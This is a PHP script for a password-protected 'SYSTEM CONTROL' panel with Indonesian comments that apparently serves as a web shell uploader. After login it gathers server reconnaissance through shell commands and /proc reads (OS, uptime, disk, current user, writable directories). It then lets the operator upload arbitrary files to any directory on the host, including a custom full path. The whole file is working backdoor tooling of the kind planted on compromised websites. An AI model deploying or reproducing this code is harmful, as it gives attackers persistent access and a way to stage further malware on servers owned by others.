<?php
session_start();

// GANTI DENGAN HASH BCRYPT ANDA
$hashedPassword = '$2a$12$yWdTvR7nY//WBlD9E07sZeNvavXuFDFdCnjQ53Xc7E16FLxi7Shmy';

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Proses login
if (isset($_POST['login'])) {
    $inputPass = $_POST['password'] ?? '';
    if (password_verify($inputPass, $hashedPassword)) {
        $_SESSION['logged_in'] = true;
        // Redirect agar tidak repost form saat refresh
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "ACCESS DENIED";
    }
}

// Jika belum login â†’ tampilkan form login minimalis
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <style>
            body {
                background: #fff;
                color: #0f0;
                font-family: 'Courier New', monospace;
                margin: 0;
                padding: 0;
            }
            .login {
                position: absolute;
                top: 10px;
                left: 10px;
                display: flex;
                gap: 6px;
                align-items: center;
            }
            .login input[type="password"] {
                padding: 4px 6px;
                border: 1px solid #0f0;
                background: transparent;
                color: #0f0;
                font-family: monospace;
                font-size: 13px;
                outline: none;
            }
            .login input[type="submit"] {
                background: #0f0;
                color: #ffffffff;
                border: none;
                padding: 4px 8px;
                font-family: monospace;
                font-weight: bold;
                font-size: 12px;
                cursor: pointer;
            }
            .login input[type="submit"]:hover {
                background: #00ff00;
            }
            .error {
                position: absolute;
                top: 35px;
                left: 10px;
                color: #f00;
                font-size: 12px;
                font-family: monospace;
            }
        </style>
    </head>
    <body>
        <div class="login">
            <form method="post">
                <input type="password" name="password" placeholder="pass" required autocomplete="off">
                <input type="submit" name="login" value="login">
            </form>
        </div>
        <?php if (isset($error)): ?>
            <div class="error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
    </body>
    </html>
    <?php
    exit;
}

// =============== PANEL UTAMA (SETelah Login) ===============

// Fungsi untuk mendapatkan info server secara fleksibel (Windows/Linux)
function getServerInfo() {
    $info = "";
    
    // Informasi dasar sistem operasi
    $info .= "System: " . php_uname() . "\n";
    $info .= "OS: " . PHP_OS . "\n";
    $info .= "PHP Version: " . PHP_VERSION . "\n";
    $info .= "Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'N/A') . "\n";
    
    // Informasi server berdasarkan OS
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // Windows
        $info .= "Windows Version:\n";
        if (function_exists('shell_exec')) {
            $winver = @shell_exec('ver 2>&1');
            if ($winver) {
                $info .= $winver . "\n";
            }
        }
        
        // Disk space (Windows)
        if (function_exists('disk_free_space')) {
            $drive = __DIR__[0] . ':\\';
            $free = @disk_free_space($drive);
            $total = @disk_total_space($drive);
            if ($free !== false && $total !== false) {
                $free_gb = round($free / (1024*1024*1024), 2);
                $total_gb = round($total / (1024*1024*1024), 2);
                $used_gb = $total_gb - $free_gb;
                $info .= "Disk {$drive}: {$used_gb}GB used, {$free_gb}GB free of {$total_gb}GB\n";
            }
        }
    } else {
        // Linux/Unix
        $info .= "Linux Info:\n";
        if (function_exists('shell_exec')) {
            // Uptime
            $uptime = @shell_exec('uptime 2>&1');
            if ($uptime) {
                $info .= "Uptime: " . trim($uptime) . "\n";
            }
            
            // Memory info
            if (file_exists('/proc/meminfo')) {
                $meminfo = @file_get_contents('/proc/meminfo');
                if ($meminfo) {
                    $lines = explode("\n", $meminfo);
                    $memtotal = '';
                    $memfree = '';
                    foreach ($lines as $line) {
                        if (strpos($line, 'MemTotal:') === 0) {
                            $memtotal = trim(str_replace('MemTotal:', '', $line));
                        }
                        if (strpos($line, 'MemFree:') === 0) {
                            $memfree = trim(str_replace('MemFree:', '', $line));
                        }
                    }
                    if ($memtotal && $memfree) {
                        $info .= "Memory: {$memfree} free of {$memtotal}\n";
                    }
                }
            }
            
            // Disk usage
            $df = @shell_exec('df -h 2>&1');
            if ($df) {
                $df_lines = explode("\n", $df);
                if (count($df_lines) > 1) {
                    $info .= "Disk Usage:\n";
                    // Ambil 3 baris pertama termasuk header
                    for ($i = 0; $i < min(4, count($df_lines)); $i++) {
                        $info .= $df_lines[$i] . "\n";
                    }
                }
            }
        }
    }
    
    // Informasi user
    if (function_exists('get_current_user')) {
        $info .= "Current User: " . get_current_user() . "\n";
    }
    
    // Home directory
    $home = getenv('HOME') ?: getenv('USERPROFILE');
    if ($home) {
        $info .= "Home Directory: " . $home . "\n";
    }
    
    // Writable directories
    $info .= "Current Directory: " . getcwd() . "\n";
    $info .= "Script Location: " . __DIR__ . "\n";
    $info .= "Writable: " . (is_writable(__DIR__) ? 'Yes' : 'No') . "\n";
    
    // PHP configuration
    $info .= "Memory Limit: " . ini_get('memory_limit') . "\n";
    $info .= "Upload Max Filesize: " . ini_get('upload_max_filesize') . "\n";
    $info .= "Post Max Size: " . ini_get('post_max_size') . "\n";
    
    return $info;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Uploader</title>
    <style>
        body {
            background: #fff;
            color: #0f0;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            font-size: 14px;
            line-height: 1.4;
        }
        .logout {
            position: absolute;
            top: 10px;
            right: 10px;
            color: #0f0;
            text-decoration: none;
            font-size: 12px;
        }
        .logout:hover {
            text-decoration: underline;
        }
        .header {
            margin-bottom: 15px;
            font-weight: bold;
        }
        .system-info {
            border: 1px solid #0f0;
            padding: 10px;
            margin-bottom: 20px;
            white-space: pre;
            font-size: 12px;
            background: transparent;
            overflow-x: auto;
            max-height: 300px;
            overflow-y: auto;
        }
        .upload-box {
            max-width: 400px;
        }
        .upload-box input[type="file"] {
            display: block;
            margin-bottom: 10px;
            color: #0f0;
            font-family: monospace;
            font-size: 13px;
        }
        .upload-box input[type="submit"] {
            background: #0f0;
            color: #000;
            border: none;
            padding: 5px 12px;
            font-family: monospace;
            font-weight: bold;
            font-size: 13px;
            cursor: pointer;
        }
        .upload-box input[type="submit"]:hover {
            background: #00ff00;
        }
        .notification {
            margin-top: 15px;
            padding: 8px;
            border-left: 3px solid;
            font-family: monospace;
            font-size: 13px;
            white-space: pre-wrap;
        }
        .notification.success {
            border-color: #0f0;
            color: #0f0;
            background: rgba(0, 255, 0, 0.05);
        }
        .notification.error {
            border-color: #f00;
            color: #f00;
            background: rgba(255, 0, 0, 0.05);
        }
        .path-selector {
            margin: 10px 0;
            font-family: monospace;
            font-size: 13px;
        }
        .path-selector select {
            background: transparent;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 4px 8px;
            font-family: monospace;
            font-size: 13px;
            outline: none;
        }
        .path-selector option {
            background: #000;
            color: #0f0;
        }
        .custom-path {
            margin-top: 5px;
        }
        .custom-path input[type="text"] {
            width: 300px;
            padding: 4px 6px;
            background: transparent;
            color: #0f0;
            border: 1px solid #0f0;
            font-family: monospace;
            font-size: 12px;
        }
    </style>
</head>
<body>

<a href="?logout=1" class="logout">[logout]</a>

<div class="header">> SYSTEM CONTROL</div>

<div class="system-info"><?= htmlspecialchars(getServerInfo()) ?></div>

<div class="upload-box">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="__" required>
        
        <div class="path-selector">
            <label for="upload_path">Upload to:</label><br>
            <select name="upload_path" id="upload_path" onchange="toggleCustomPath()">
                <option value="current">Current Directory (<?= htmlspecialchars(__DIR__) ?>)</option>
                <option value="parent">Parent Directory (<?= htmlspecialchars(dirname(__DIR__)) ?>)</option>
                <option value="home">Home Directory</option>
                <option value="tmp">Temporary Directory</option>
                <option value="custom">Custom Path...</option>
            </select>
            
            <div id="custom_path_container" class="custom-path" style="display: none;">
                <input type="text" name="custom_path" placeholder="Enter full path..." value="<?= htmlspecialchars(__DIR__) ?>">
            </div>
        </div>
        
        <input type="submit" name="_" value="upload">
    </form>

    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['__'])): ?>
    <?php
    $tmp = $_FILES['__']['tmp_name'];
    $name = basename($_FILES['__']['name']);
    
    if (!is_uploaded_file($tmp)) {
        echo '<div class="notification error">> Upload failed</div>';
        return;
    }
    
    // Determine upload path
    $upload_path = $_POST['upload_path'] ?? 'current';
    $custom_path = $_POST['custom_path'] ?? '';
    
    switch ($upload_path) {
        case 'current':
            $target_dir = __DIR__ . '/';
            break;
        case 'parent':
            $target_dir = dirname(__DIR__) . '/';
            break;
        case 'home':
            $home = getenv('HOME') ?: getenv('USERPROFILE');
            $target_dir = $home ? $home . '/' : __DIR__ . '/';
            break;
        case 'tmp':
            $target_dir = sys_get_temp_dir() . '/';
            break;
        case 'custom':
            $target_dir = $custom_path ? rtrim($custom_path, '/\\') . '/' : __DIR__ . '/';
            break;
        default:
            $target_dir = __DIR__ . '/';
    }
    
    // Create directory if it doesn't exist
    if (!is_dir($target_dir)) {
        if (!@mkdir($target_dir, 0755, true)) {
            echo '<div class="notification error">> Cannot create directory: ' . htmlspecialchars($target_dir) . '</div>';
            return;
        }
    }
    
    // Check if directory is writable
    if (!is_writable($target_dir)) {
        echo '<div class="notification error">> Directory is not writable: ' . htmlspecialchars($target_dir) . '</div>';
        return;
    }
    
    $target_file = $target_dir . $name;
    
    // Prevent directory traversal
    $real_target = realpath($target_dir) . DIRECTORY_SEPARATOR . $name;
    $real_target_dir = realpath($target_dir);
    
    if ($real_target_dir === false || strpos($real_target, $real_target_dir) !== 0) {
        echo '<div class="notification error">> Invalid path</div>';
        return;
    }
    
    // Move uploaded file
    if (move_uploaded_file($tmp, $real_target)) {
        echo '<div class="notification success">';
        echo "> File uploaded successfully!\n";
        echo "> Original Name: " . htmlspecialchars($name) . "\n";
        echo "> Saved to: " . htmlspecialchars($real_target) . "\n";
        echo "> Size: " . filesize($real_target) . " bytes\n";
        echo "> Permissions: " . substr(sprintf('%o', fileperms($real_target)), -4);
        echo '</div>';
    } else {
        echo '<div class="notification error">> Failed to upload file. Check permissions.</div>';
    }
    ?>
<?php endif; ?>
</div>

<script>
function toggleCustomPath() {
    var select = document.getElementById('upload_path');
    var customContainer = document.getElementById('custom_path_container');
    
    if (select.value === 'custom') {
        customContainer.style.display = 'block';
    } else {
        customContainer.style.display = 'none';
    }
}
</script>

</body>
</html>
